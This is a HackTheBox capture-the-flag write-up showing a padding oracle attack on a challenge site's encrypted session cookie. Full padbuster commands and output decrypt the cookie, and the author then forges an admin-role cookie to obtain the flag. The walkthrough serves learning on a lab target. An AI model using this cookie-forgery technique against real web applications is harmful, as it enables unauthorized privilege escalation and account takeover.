# I know Mag1k

Completed: Yes
Platform: HackTheBox

When I went to this site, I saw the 2 options, registration and logging in. I made an account and then logged in. Though it gave me nothing except one thing as usual - a cookie. And this cookie had the hint as the key `iknowmag1k`: `Cookie: PHPSESSID=5l1jd3s13oducofqtgu75siit2; iknowmag1k=A0jmArssc%2FGWl0NROGUiC0GqcxWRVqNG0%2BHBkoxP6gdmEiW1m4dN4A%3D%3D`. I decoded the cookie, firstly as URL, secondly as URL too, and finally got some hex + base64 string. Then, I checked HackTricks and found these interesting thoughts about cookies and their advanced exploitation: [https://book.hacktricks.xyz/pentesting-web/hacking-with-cookies#advanced-cookies-attacks](https://book.hacktricks.xyz/pentesting-web/hacking-with-cookies#advanced-cookies-attacks).  I tried to create other accounts, but it gave me no clue about brute force or guessing the admin account cookie. Thus, remains the main vector is padding Oracle. Also, with feroxbuster I found these URLs:

```bash
200        0l        0w        0c http://46.101.23.188:31220/utils/crypt.php
200        0l        0w        0c http://46.101.23.188:31220/utils/index.php
200        0l        0w        0c http://46.101.23.188:31220/utils/recaptcha.php
```

`crypt.php` gives another thought about padding Oracle. So, this attack allows us to decrypt the cookie without knowing the encryption key. Also, great material to understand padding Oracle: [https://resources.infosecinstitute.com/topic/padding-oracle-attack-2/](https://resources.infosecinstitute.com/topic/padding-oracle-attack-2/). Finally, the program `padbuster` did the job:

```bash
 padbuster http://46.101.23.188:31220/profile.php --cookies "iknowmag1k=A0jmArssc%2FGWl0NROGUiC0GqcxWRVqNG0%2BHBkoxP6gdmEiW1m4dN4A%3D%3D" A0jmArssc%2FGWl0NROGUiC0GqcxWRVqNG0%2BHBkoxP6gdmEiW1m4dN4A%3D%3D 8

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 302
[+] Location: login.php
[+] Content Length: 0

INFO: Starting PadBuster Decrypt Mode
*** Starting Block 1 of 4 ***

INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID#     Freq    Status  Length  Location
-------------------------------------------------------
1       1       302     0       login.php
2 **    255     500     0       N/A
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2

Continuing test with selection 2

[+] Success: (54/256) [Byte 8]
[+] Success: (173/256) [Byte 7]
[+] Success: (163/256) [Byte 6]
[+] Success: (38/256) [Byte 5]
[+] Success: (140/256) [Byte 4]
[+] Success: (107/256) [Byte 3]
[+] Success: (147/256) [Byte 2]
[+] Success: (144/256) [Byte 1]

Block 1 Results:
[+] Cipher Text (HEX): 969743513865220b
[+] Intermediate Bytes (HEX): 786a9371de5e51cb
[+] Plain Text: {"user":

Use of uninitialized value $plainTextBytes in concatenation (.) or string at /usr/bin/padbuster line 361, <STDIN> line 1.
*** Starting Block 2 of 4 ***

[+] Success: (216/256) [Byte 8]
[+] Success: (244/256) [Byte 7]
[+] Success: (188/256) [Byte 6]
[+] Success: (184/256) [Byte 5]
[+] Success: (217/256) [Byte 4]
[+] Success: (224/256) [Byte 3]
[+] Success: (28/256) [Byte 2]
[+] Success: (68/256) [Byte 1]

Block 2 Results:
[+] Cipher Text (HEX): 41aa73159156a346
[+] Intermediate Bytes (HEX): b4e326224c470e29
[+] Plain Text: "test","

*** Starting Block 3 of 4 ***

[+] Success: (206/256) [Byte 8]
[+] Success: (125/256) [Byte 7]
[+] Success: (145/256) [Byte 6]
[+] Success: (73/256) [Byte 5]
[+] Success: (139/256) [Byte 4]
[+] Success: (231/256) [Byte 3]
[+] Success: (62/256) [Byte 2]
[+] Success: (197/256) [Byte 1]

Block 3 Results:
[+] Cipher Text (HEX): d3e1c1928c4fea07
[+] Intermediate Bytes (HEX): 33c51f70b36c8133
[+] Plain Text: role":"u

*** Starting Block 4 of 4 ***

[+] Success: (251/256) [Byte 8]
[+] Success: (21/256) [Byte 7]
[+] Success: (177/256) [Byte 6]
[+] Success: (11/256) [Byte 5]
[+] Success: (75/256) [Byte 4]
[+] Success: (75/256) [Byte 3]
[+] Success: (125/256) [Byte 2]
[+] Success: (88/256) [Byte 1]

Block 4 Results:
[+] Cipher Text (HEX): 661225b59b874de0
[+] Intermediate Bytes (HEX): a084b3b0f14ce904
[+] Plain Text: ser"}

-------------------------------------------------------
** Finished ***

[+] Decrypted value (ASCII): {"user":"test","role":"user"}

[+] Decrypted value (HEX): 7B2275736572223A2274657374222C22726F6C65223A2275736572227D030303

[+] Decrypted value (Base64): eyJ1c2VyIjoidGVzdCIsInJvbGUiOiJ1c2VyIn0DAwM=

-------------------------------------------------------
```

Okay, we decrypted the cookie, now, it's time to modify it and get access to the admin account. Use this tool again to encrypt the right admin cookie:

```bash
padbuster http://46.101.23.188:31220/profile.php --cookies "iknowmag1k=A0jmArssc%2FGWl0NROGUiC0GqcxWRVqNG0%2BHBkoxP6gdmEiW1m4dN4A%3D%3D" A0jmArssc%2FGWl0NROGUiC0GqcxWRVqNG0%2BHBkoxP6gdmEiW1m4dN4A%3D%3D 8 -plaintext "{\"user\":\"admin\",\"role\":\"admin\"}"

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 302
[+] Location: login.php
[+] Content Length: 0

INFO: Starting PadBuster Encrypt Mode
[+] Number of Blocks: 4

INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID#     Freq    Status  Length  Location
-------------------------------------------------------
1       1       302     0       login.php
2 **    255     500     0       N/A
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2

Continuing test with selection 2

[+] Success: (97/256) [Byte 8]
[+] Success: (155/256) [Byte 7]
[+] Success: (87/256) [Byte 6]
[+] Success: (153/256) [Byte 5]
[+] Success: (61/256) [Byte 4]
[+] Success: (188/256) [Byte 3]
[+] Success: (151/256) [Byte 2]
[+] Success: (167/256) [Byte 1]

Block 4 Results:
[+] New Cipher Text (HEX): 300a2faf0d881a9f
[+] Intermediate Bytes (HEX): 516e42c663aa679e

[+] Success: (197/256) [Byte 8]
[+] Success: (77/256) [Byte 7]
[+] Success: (51/256) [Byte 6]
[+] Success: (253/256) [Byte 5]
[+] Success: (25/256) [Byte 4]
[+] Success: (182/256) [Byte 3]
[+] Success: (226/256) [Byte 2]
[+] Success: (96/256) [Byte 1]

Block 3 Results:
[+] New Cipher Text (HEX): 8a6b238e62ec8b18
[+] Intermediate Bytes (HEX): a8194ce207ceb13a

[+] Success: (203/256) [Byte 8]
[+] Success: (77/256) [Byte 7]
[+] Success: (130/256) [Byte 6]
[+] Success: (176/256) [Byte 5]
[+] Success: (129/256) [Byte 4]
[+] Success: (80/256) [Byte 3]
[+] Success: (53/256) [Byte 2]
[+] Success: (14/256) [Byte 1]

Block 2 Results:
[+] New Cipher Text (HEX): d8add2173d139318
[+] Intermediate Bytes (HEX): faccb67a547db134

[+] Success: (83/256) [Byte 8]
[+] Success: (107/256) [Byte 7]
[+] Success: (221/256) [Byte 6]
[+] Success: (52/256) [Byte 5]
[+] Success: (219/256) [Byte 4]
[+] Success: (207/256) [Byte 3]
[+] Success: (239/256) [Byte 2]
[+] Success: (161/256) [Byte 1]

Block 1 Results:
[+] New Cipher Text (HEX): 2c344253ad52b596
[+] Intermediate Bytes (HEX): 57163720c82097ac

-------------------------------------------------------
** Finished ***

[+] Encrypted value is: LDRCU61StZbYrdIXPROTGIprI45i7IsYMAovrw2IGp8AAAAAAAAAAA%3D%3D
-------------------------------------------------------
```

Replace your cookie with a new cookie and take the flag.